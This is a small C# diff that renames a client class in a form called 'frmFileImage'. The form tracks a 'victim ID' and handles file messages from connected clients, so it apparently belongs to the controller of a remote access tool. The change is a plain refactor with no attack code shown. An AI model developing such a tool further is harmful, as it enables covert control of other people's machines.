@@ -12,7 +12,7 @@ namespace Eden
 {
     public partial class frmFileImage : Form
     {
-        public Client m_clnt { get; set; }
+        public clsClient m_clnt { get; set; }
         public string m_szVictimID { get; set; }
         struct stImageItem
         {
@@ -31,7 +31,7 @@ namespace Eden
 
         private stImageItem fnGetItemTag(ListViewItem item) => (stImageItem)item.Tag;
 
-        void Received(Client clnt, string szVictimID, string[] aMsg)
+        void Received(clsClient clnt, string szVictimID, string[] aMsg)
         {
             if (aMsg[0] == "file")
             {
